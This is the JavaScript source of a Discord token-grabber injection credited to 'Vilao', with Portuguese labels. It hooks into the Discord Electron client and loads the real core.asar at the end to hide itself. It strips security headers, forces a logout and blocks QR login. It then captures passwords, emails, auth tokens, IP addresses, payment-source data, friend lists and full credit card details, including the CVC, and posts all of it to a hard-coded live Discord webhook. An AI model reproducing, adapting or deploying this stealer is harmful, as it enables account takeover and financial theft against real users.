const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const querystring = require('querystring');
const os = require('os')
var webhook = "https://discordapp.com/api/webhooks/1003362608755265716/MaTvuzGweuEAf67Jdx8Ku0D0zLk4RTZ3XuG7kg8Ld5pJN8Qs8WGYeAUHEOdzbi6cbm_z";
const computerName = os.hostname();

String.prototype.insert = function (index, string) {
	if (index > 0) {
		return this.substring(0, index) + string + this.substr(index);
	}

	return string + this;
};

const config = {
    "logout": "%LOGOUT%1",
    "inject-notify": "true",
    "logout-notify": "%LOGOUTNOTI%1",
    "init-notify": "%INITNOTI%1",
    "embed-color": 0000000,
    "disable-qr-code": "%DISABLEQRCODE%1"
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}
	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}
})

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Vilao"))) return !0;
    return fs.rmdirSync(path.join(__dirname, "Vilao")), BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', !0).then(e => {}), !1
}
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
			callback({
				cancel: true
			})
			return;
		}
	}
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function GetNitro(flags) {
	if (flags == 0) {
		return "Sem nitro"
	}
	if (flags == 1) {
		return "<:classic:896119171019067423> \`Nitro Classic\`"
	}
	if (flags == 2) {
		return "<a:boost:824036778570416129> \`Nitro Boost\`"
	} else {
		return "Sem nitro"
	}
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = ""
	}
	return badges
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "<:bravery:874750808388952075> "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "<:brilliance:874750808338608199> "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "<:balance:874750808267292683> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = "Nada"
	}
	return badges
}

function Login(email, password, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Nenhum amigo raro"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\`✔️\`" + " :credit_card:"
												} else {
													return "\`❌\`"
												}
											})
											if (billing == "") {
												billing = "\`❌\`"
											}
											return billing
										}
										const json = JSON.parse(info);
										var params = {
											username: "Vilao",
											content: "https://github.com/viIao",
											embeds: [{
												title: "Login",
												color: config['embed-color'],
												fields: [{
													name: "Nome",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID",
													value: `\`${json.id}\``,
													inline: !0       
                                                }, {
													name: "Email",
													value: `\`${email}\``,
													inline: !1
                                                }, {
													name: "Badges",
													value: `${GetBadges(json.flags)}`,
													inline: !0 
                                                }, {
													name: "Nitro",
													value: `${GetNitro(json.premium_type)}`,
													inline: !0
												}, {
													name: "Senha",
													value: `\`${password}\``,
													inline: !0
                                                }, {
													name: "Pagamento",
													value: `${Cool()}`,
													inline: !1
                                                }, {
													name: "Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
                                                }, {   
                                                    name: "PC",
													value: `\`\`\`NomePC: ${computerName}\nIP: ${ip}\`\`\``,
													inline: !1
												}, ],
												thumbnail: {
													url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												title: `${totalFriends()} Amigos`,
												color: config['embed-color'],
												description: CalcFriends(),
												footer: {
													text: "By: Vilão"
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
				                })
			            })
		        })
	    })
}

function ChangePassword(e, t, n) {
    const r = BrowserWindow.getAllWindows()[0];
    r.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(a => {
        r.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(s => {
            r.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`, !0).then(r => {
                const o = JSON.parse(a);
                var i = {
                    username: "Vilao",
                    embeds: [{
                        title: "Senha alterada",
                        color: 0000000,
                        fields: [{
                            name: "Nome",
                            value: `\`${o.username}#${o.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${o.id}\``,
                            inline: !0
                        }, {
                            name: "Email",
                            value: `\`${o.email}\``,
                            inline: !1
                        }, {
                            name: "Badge",
                            value: `${GetBadges(o.flags)}`,
                            inline: !0
                        }, {
                            name: "Nitro",
                            value: `${GetNitro(o.premium_type)}`,
                            inline: !0
                        }, {
                            name: "Senha antiga",
                            value: `\`${e}\``,
                            inline: !0
                        }, {
                            name: "Nova senha",
                            value: `\`${t}\``,
                            inline: !0
                        }, {
                            name: "Token",
                            value: `\`\`\`${n}\`\`\``,
                            inline: !1
                        }, {
                            name: "PC",
                            value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\`\`\``,
                            inline: !1
                        }, {
                            name: "Conta",
                            value: `\`\`\`Pagamentos: ${function(){const e=JSON.parse(r);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ Paypal";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ Cartão"}}),""==t&&(t="❌"),t}()}\n\`\`\``,
                            inline: !1
                                    }],
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}`
                        }
                    }]
                };
                SendToWebhook(JSON.stringify(i))
            })
        })
    })
}

function ChangeEmail(e, t, n) {
    const r = BrowserWindow.getAllWindows()[0];
    r.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(a => {
        r.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(s => {
            r.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`, !0).then(r => {
                const o = JSON.parse(a);
                var i = {
                    username: "Vilao",
                    embeds: [{
                        title: "Email Alterado",
                        color: 0000000,
                        fields: [{
                            name: "Nome",
                            value: `\`${o.username}#${o.discriminator}\``,
                            inline: !0
                        }, {
                            name: "ID",
                            value: `\`${o.id}\``,
                            inline: !0
                        }, {
                            name: "Novo Email",
                            value: `\`${e}\``,
                            inline: !1
                        }, {
                            name: "Badge",
                            value: `${GetBadges(o.flags)}`,
                            inline: !0
                        }, {
                            name: "Nitro",
                            value: `${GetNitro(o.premium_type)}`,
                            inline: !0
                        }, {
                            name: "Senha",
                            value: `\`${t}\``,
                            inline: !0
                        }, {
                            name: "Token",
                            value: `\`\`\`${n}\`\`\``,
                            inline: !1
                        }, {
                            name: "PC",
                            value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\`\`\``,
                            inline: !1
                        }, {
                            name: "Conta",
                            value: `\`\`\`Pagamento: ${function(){const e=JSON.parse(r);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ :credit_card:"}}),""==t&&(t="❌"),t}()}\`\`\``,
                            inline: !1 
                        }],
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}`
                        }
                    }]
                };
                SendToWebhook(JSON.stringify(i))
            })
        })
    })
}

function CreditCardAdded(e, t, n, r, a, s, o, i, l, p) {
    const d = BrowserWindow.getAllWindows()[0];
    d.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${p}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`, !0).then(u => {
        d.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0).then(d => {
            var c = JSON.parse(u),
                m = {
                    username: "Vilao",
                    content: "",
                    embeds: [{
                        title: "Cartão Adicionado",
                        description: "**Nome:**```" + c.username + "#" + c.discriminator + "```\n**ID:**```" + c.id + "```\n**Email:**```" + c.email + "```\n**Nitro:**" + GetNitro(c.premium_type) + "\n**Badges:**```" + GetBadges(c.flags) + "```\n**Cartão N°: **```" + e + "```\n**Expira em: **```" + n + "/" + r + "```\n**CVC: **```" + t + "```\n**Região: **```" + l + "```\n**Estado: **```" + o + "```\n**Cidade: **```" + s + "```\n**CEP:**```" + i + "```\n**Bairro: **```" + a + "```\n**Token:**```" + p + "```\n**IP: **```" + d + "```",
                        thumbnail: {
                            url: "https://cdn.discordapp.com/avatars/" + c.id + "/" + c.avatar
                        }
                    }]
                };
            SendToWebhook(JSON.stringify(m))
        })
    })
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
    FirstTime() && (e.url.startsWith("wss://") ? t({
        cancel: !0
    }) : t({
        cancel: !1
    }))
}), session.defaultSession.webRequest.onHeadersReceived((e, t) => {
    e.url.startsWith(webhook.split("/")[2]) ? t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Headers": "*"
        }
    }) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Headers": "*"
        }
    }))
});

const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
    if (e.url.endsWith("login") && 200 == e.statusCode) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
            n = t.login,
            r = t.password;
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            Login(n, r, e)
        })
    }
    if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
        if (null != t.password && null != t.password && "" != t.password) {
            if (null != t.new_password && null != t.new_password && "" != t.new_password) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangePassword(t.password, t.new_password, e)
                })
            }
            if (null != t.email && null != t.email && "" != t.email) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangeEmail(t.email, t.password, e)
                })
            }
        }
    }
    if (e.url.endsWith("tokens")) {
        const t = BrowserWindow.getAllWindows()[0],
            n = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
        t.webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            CreditCardAdded(n["card[number]"], n["card[cvc]"], n["card[exp_month]"], n["card[exp_year]"], n["card[address_line1]"], n["card[address_city]"], n["card[address_state]"], n["card[address_zip]"], n["card[address_country]"], e)
        })
    }
}), module.exports = require("./core.asar");
